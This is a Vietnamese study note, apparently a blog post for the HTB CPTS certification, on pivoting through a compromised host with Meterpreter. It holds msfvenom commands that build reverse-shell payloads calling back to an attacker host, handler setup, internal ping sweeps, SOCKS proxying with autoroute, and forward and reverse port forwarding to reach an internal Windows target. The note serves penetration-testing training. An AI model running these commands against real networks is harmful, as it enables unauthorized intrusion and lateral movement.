---
title: "Meterpreter Tunneling & Port Forwarding"
date: 2026-04-20 20:30:40 +0700
categories: [HTB_CPTS, Pivot]
tags: [pivoting, meterpreter, metasploit, port-forwarding]
description: "HTB CPTS note về Meterpreter route, port forwarding và pivoting."
pin: false
---
## Tổng quan

Thay vì dùng SSH để tạo tunnel/port forward, ta có thể tận dụng **Meterpreter session** đang có sẵn trên pivot host để làm điều tương tự — tiện hơn vì mọi thứ nằm trong Metasploit.

Kịch bản: Ta đã có Meterpreter shell trên **Ubuntu pivot host**, mạng nội bộ đích là `<INTERNAL_SUBNET>`, và Windows target ở `<TARGET_IP>`.

---
## 1. Tạo Meterpreter Shell trên Pivot Host

### Bước 1: Tạo payload cho Ubuntu

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<LHOST> -f elf -o <OUTPUT_FILE> LPORT=<LPORT>
```

### Bước 2: Khởi động multi/handler

```bash
msf6 > use exploit/multi/handler
set lhost 0.0.0.0
set lport <LPORT>
set payload linux/x64/meterpreter/reverse_tcp
run
```

### Bước 3: Thực thi payload trên pivot host

```bash
chmod +x <OUTPUT_FILE>
./<OUTPUT_FILE>
```

> Sau khi thực thi, Meterpreter session sẽ mở trên attack host.

---
## 2. Ping Sweep qua Meterpreter

Sau khi có session, kiểm tra xem host nào đang sống trong mạng nội bộ.

### Dùng module Metasploit

```bash
meterpreter > run post/multi/gather/ping_sweep RHOSTS=<INTERNAL_SUBNET>
```

### Dùng for loop thủ công (nếu không có module)

**Linux pivot host:**

```bash
for i in {1..254} ;do (ping -c 1 <SUBNET_PREFIX>.$i | grep "bytes from" &) ;done
```

**Windows CMD:**

```cmd
for /L %i in (1 1 254) do ping <SUBNET_PREFIX>.%i -n 1 -w 100 | find "Reply"
```

**PowerShell:**

```powershell
1..254 | % {"<SUBNET_PREFIX>.$($_): $(Test-Connection -count 1 -comp <SUBNET_PREFIX>.$($_) -quiet)"}
```

> **Nếu ping bị firewall chặn (ICMP blocked), chuyển sang TCP scan với Nmap qua proxychains.**

---
## 3. SOCKS Proxy qua Meterpreter (proxychains)

Mục tiêu: Dùng `proxychains` để route traffic của Nmap (hoặc tool bất kỳ) qua Meterpreter session vào mạng nội bộ.

### Bước 1: Khởi động SOCKS proxy trong MSF

```bash
msf6 > use auxiliary/server/socks_proxy
set SRVPORT 9050
set SRVHOST 0.0.0.0
set version 4a
run
```

Kiểm tra job đang chạy:

```bash
msf6 > jobs
```

### Bước 2: Thêm dòng vào `/etc/proxychains.conf`

```
socks4  127.0.0.1 9050
```

> **Nếu dùng SOCKS5, đổi thành `socks5 127.0.0.1 9050`.**


### Bước 3: Thêm route qua AutoRoute

```bash
msf6 > use post/multi/manage/autoroute
set SESSION <SESSION_ID>
set SUBNET <INTERNAL_SUBNET>
run
```

Hoặc chạy trực tiếp từ Meterpreter session:

```bash
meterpreter > run autoroute -s <INTERNAL_SUBNET>
```

Kiểm tra route đang active:

```bash
meterpreter > run autoroute -p
```

### Bước 4: Scan qua proxychains

```bash
proxychains nmap <TARGET_IP> -p<TARGET_PORT> -sT -v -Pn
```

> **Phải dùng `-sT` (TCP Connect Scan) — proxychains không hỗ trợ SYN scan (`-sS`).**

---

## 4. Port Forwarding qua Meterpreter (`portfwd`)

Thay vì dùng proxychains, ta có thể tạo **local TCP relay** trực tiếp: lắng nghe trên port nội bộ của attack host, forward mọi packet tới target trong mạng nội bộ.

### Forward (Local → Remote)

```bash
meterpreter > portfwd add -l <LOCAL_PORT> -p <TARGET_PORT> -r <TARGET_IP>
```

|Flag|Ý nghĩa|
|---|---|
|`-l <LOCAL_PORT>`|Port lắng nghe trên attack host|
|`-p <TARGET_PORT>`|Port đích trên remote host|
|`-r <TARGET_IP>`|Remote host cần kết nối|

Sau đó kết nối RDP vào Windows target qua localhost:

```bash
xfreerdp /v:localhost:<LOCAL_PORT> /u:<USERNAME> /p:<PASSWORD>
```

Kiểm tra session bằng netstat:

```bash
netstat -antp
# tcp  127.0.0.1:<RAND_PORT>  127.0.0.1:<LOCAL_PORT>  ESTABLISHED
```

---
## 5. Reverse Port Forwarding qua Meterpreter

Kịch bản: Ta muốn nhận shell từ **Windows target** (nằm trong mạng nội bộ) về attack host. Windows không thể kết nối thẳng ra ngoài → dùng pivot host làm trung gian.

### Luồng hoạt động

```
Windows target
  └─► Pivot host (port <PIVOT_PORT>)
        └─► Attack host (port <LOCAL_PORT>)
```

### Bước 1: Tạo reverse port forward rule

```bash
meterpreter > portfwd add -R -l <LOCAL_PORT> -p <PIVOT_PORT> -L <LHOST>
```

|Flag|Ý nghĩa|
|---|---|
|`-R`|Reverse mode|
|`-l <LOCAL_PORT>`|Port lắng nghe trên attack host|
|`-p <PIVOT_PORT>`|Port lắng nghe trên pivot host|
|`-L <LHOST>`|IP attack host (nơi nhận forward)|

### Bước 2: Khởi động multi/handler trên attack host

```bash
meterpreter > bg
msf6 > use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LPORT <LOCAL_PORT>
set LHOST 0.0.0.0
run
```

### Bước 3: Tạo payload Windows và thực thi

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<PIVOT_IP> -f exe -o <OUTPUT_FILE>.exe LPORT=<PIVOT_PORT>
```

> `LHOST` trỏ về **pivot host** (không phải attack host), vì Windows gửi shell tới pivot, pivot forward về attack host.

Khi thực thi `<OUTPUT_FILE>.exe` trên Windows target → shell về attack host qua pivot.

---

## So sánh các kỹ thuật

| Kỹ thuật                                    | Dùng khi nào                                          |
| ------------------------------------------- | ----------------------------------------------------- |
| `ping_sweep` module                         | Kiểm tra host sống trong mạng nội bộ                  |
| `socks_proxy` + `autoroute` + `proxychains` | Cần route nhiều tool (Nmap, evil-winrm...) qua pivot  |
| `portfwd` forward                           | Kết nối tới 1 port cụ thể của 1 target (RDP, SMB...)  |
| `portfwd` reverse                           | Nhận shell từ target không thể kết nối thẳng ra ngoài |
